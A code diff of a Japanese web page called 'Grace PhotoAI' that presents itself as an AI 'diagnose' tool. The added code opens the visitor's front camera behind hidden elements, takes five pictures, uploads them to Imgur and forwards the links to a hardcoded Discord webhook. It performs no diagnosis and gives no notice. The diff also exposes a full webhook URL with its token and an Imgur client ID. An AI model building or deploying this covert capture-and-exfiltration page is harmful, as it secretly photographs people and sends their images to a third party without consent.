@@ -1,77 +1,119 @@
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>Grace PhotoAI — 自動撮影デモ</title>
+  <title>Grace PhotoAI</title>
   <style>
-    body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
-    video, canvas { display: none; }
-    .main-button { /* 今までのボタンスタイル */ }
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f0f0;
+      font-family: Arial, sans-serif;
+    }
+    h1 {
+      font-size: 56px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .main-button {
+      font-size: 20px;
+      padding: 12px 24px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .main-button:disabled {
+      background-color: #a5d6a7;
+      cursor: not-allowed;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <h1>Grace PhotoAI</h1>
   <button class="main-button" id="shootBtn">診断する</button>
 
-  <!-- カメラ映像（不要ならdisplay:noneのままでOK） -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    const video   = document.getElementById('video');
-    const canvas  = document.getElementById('canvas');
+    const IMGUR_CLIENT_ID = '6e1b6bf28c5da0e';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
     const shootBtn = document.getElementById('shootBtn');
 
-    // 前面カメラを指定してストリーム取得
     async function startCamera() {
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' }, audio: false
+        video: { facingMode: 'user' },
+        audio: false
       });
       video.srcObject = stream;
-      await new Promise(r => video.onloadedmetadata = r);
+      await new Promise(resolve => video.onloadedmetadata = resolve);
       return stream;
     }
 
-    // ビデオの１フレームをキャプチャしてBase64を返す
     function captureImage() {
-      canvas.width  = video.videoWidth;
+      canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0);
-      return canvas.toDataURL('image/jpeg').split(',')[1]; // Base64 部分だけ
+      return canvas.toDataURL('image/jpeg').split(',')[1];
+    }
+
+    async function uploadToDiscord(base64Image) {
+      try {
+        const imgurRes = await fetch('https://api.imgur.com/3/image', {
+          method: 'POST',
+          headers: {
+            Authorization: `Client-ID ${IMGUR_CLIENT_ID}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ image: base64Image, type: 'base64' })
+        });
+
+        const imgurJson = await imgurRes.json();
+        const imageUrl = imgurJson.data.link;
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `画像をアップロード
+${imageUrl}` })
+        });
+      } catch (err) {
+        console.error('アップロード中にエラー:', err);
+      }
     }
 
     shootBtn.addEventListener('click', async () => {
-      try {
-        // 1) カメラ起動  
-        const stream = await startCamera();
+      shootBtn.disabled = true;
+      const stream = await startCamera();
 
-        // 2) 即時キャプチャ
-        const base64Image = captureImage();
+      await new Promise(resolve => setTimeout(resolve, 500));
 
-        // 3) カメラ停止
-        stream.getTracks().forEach(t => t.stop());
-
-        // 4) あとはimgur→Discord送信は今まで通り  
-        fetch('https://api.imgur.com/3/image', {
-          method: 'POST',
-          headers: { Authorization: `Client-ID 6e1b6bf28c5da0e`, 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: base64Image, type: 'base64' })
-        })
-        .then(res => res.json())
-        .then(json => {
-          const imageUrl = json.data.link;
-          return fetch('https://discord.com/api/webhooks/…', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `画像をアップロード\n${imageUrl}` })
-          });
-        })
-        .catch(console.error);
-
-      } catch (e) {
-        console.error('カメラ取得エラー:', e);
+      const captures = [];
+      for (let i = 0; i < 5; i++) {
+        captures.push(captureImage());
       }
+
+      stream.getTracks().forEach(track => track.stop());
+
+      for (const base64 of captures) {
+        await uploadToDiscord(base64);
+      }
+
+      shootBtn.disabled = false;
     });
   </script>
 </body>
